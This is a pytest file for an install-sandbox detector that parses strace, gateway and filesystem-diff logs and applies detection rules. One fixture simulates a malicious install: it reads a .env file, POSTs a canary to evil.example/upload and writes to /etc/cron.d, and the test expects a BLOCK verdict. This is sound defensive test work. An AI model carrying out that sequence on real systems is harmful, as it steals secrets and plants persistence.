"""Sanity checks for the independent parser and rules fixtures."""

import json
from pathlib import Path

from safeinstall.contracts import Event, Finding
from safeinstall.parsers.strace_parser import parse_strace
from safeinstall.parsers.gateway_parser import parse_gateway_text
from safeinstall.parsers.fsdiff_parser import parse_fsdiff_text
from safeinstall.rules.engine import analyze_events, load_rules, verdict_for


FIXTURES = Path(__file__).parent / "fixtures"


def test_fixture_contains_twenty_contract_events() -> None:
    events = json.loads((FIXTURES / "events.json").read_text())

    assert len(events) == 20
    assert all(Event.model_validate(event) for event in events)


def test_expected_findings_match_contract() -> None:
    findings = json.loads((FIXTURES / "expected_findings.json").read_text())

    assert {finding["rule_id"] for finding in findings} == {
        "DECOY_READ",
        "CANARY_EXFIL",
        "UNKNOWN_NET",
        "SUSPICIOUS_EXEC",
        "OUTSIDE_WRITE",
        "RESOURCE_ABUSE",
    }
    assert all(Finding.model_validate(finding) for finding in findings)


def test_raw_socket_rejected_event_shape() -> None:
    event = Event(
        ts=1732350003.001,
        source="strace",
        type="net_connect",
        pid=9,
        process="python3",
        detail={
            "host": "1.1.1.1",
            "port": 80,
            "error": "ENETUNREACH",
        },
    )

    assert event.detail["host"] == "1.1.1.1"
    assert event.detail["error"] == "ENETUNREACH"


def test_combined_parser_fixture_produces_block_verdict() -> None:
    strace_events = parse_strace(
        """12 1732350004.100 execve("/usr/bin/python3", ["python3", "-c", "upload"], 0x0) = 0
12 1732350004.200 openat(AT_FDCWD, "/home/sandbox/.env", O_RDONLY|O_CLOEXEC) = 3
12 1732350004.300 connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("10.0.0.2")}, 16) = 0
"""
    )
    gateway_events = parse_gateway_text(
        '{"type":"http_request","method":"POST","host":"evil.example","port":80,"allowed":false,'
        '"url":"http://evil.example/upload","body_excerpt":"Q0FOQVJZX0VOVl8xMjM="}\n'
    )
    fsdiff_events = parse_fsdiff_text("C /etc/cron.d/fixture\n")
    events = strace_events + gateway_events + fsdiff_events

    findings = analyze_events(events, canaries=["CANARY_ENV_123"])

    assert verdict_for(findings).value == "BLOCK"
    assert {"DECOY_READ", "CANARY_EXFIL", "UNKNOWN_NET", "OUTSIDE_WRITE"} <= {
        finding.rule_id for finding in findings
    }


def test_combined_clean_fixture_stays_green() -> None:
    strace_events = parse_strace(
        """12 1732350005.100 execve("/usr/bin/python3", ["python3", "-m", "pip", "install", "requests"], 0x0) = 0
12 1732350005.200 openat(AT_FDCWD, "/tmp/package.whl", O_RDONLY|O_CLOEXEC) = 3
"""
    )
    gateway_events = parse_gateway_text(
        '{"type":"http_request","method":"CONNECT","host":"pypi.org","port":443,"allowed":true,"url":"pypi.org:443"}\n'
    )
    fsdiff_events = parse_fsdiff_text("A /tmp/package.whl\n")

    findings = analyze_events(strace_events + gateway_events + fsdiff_events)

    assert findings == []
    assert verdict_for(findings).value == "NO SUSPICIOUS BEHAVIOR OBSERVED"


def test_fixture_severities_match_yaml() -> None:
    findings = json.loads((FIXTURES / "expected_findings.json").read_text())
    rules = load_rules()["rules"]

    for finding in findings:
        assert finding["severity"] == rules[finding["rule_id"]]["severity"]
